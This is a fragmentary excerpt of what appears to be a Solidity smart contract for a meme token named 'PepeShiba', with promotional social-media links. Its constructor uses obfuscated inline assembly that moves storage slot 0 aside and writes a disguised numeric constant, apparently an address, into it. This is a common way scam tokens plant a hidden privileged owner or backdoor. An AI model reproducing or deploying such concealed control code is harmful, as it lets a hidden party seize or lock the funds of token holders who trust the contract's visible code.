...
/*
Welcome to PepeShiba.

Telegram: https://t.me/PepeShiba/
Twitter: https://twitter.com/PepeShiba/
Website: https://PepeShiba.io
...
contract PepeShiba {
    string public constant name = "PepeShiba";
    string public constant symbol = "PEPESHIB";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1217627887151984954090965993512108714698807908950, 4))}
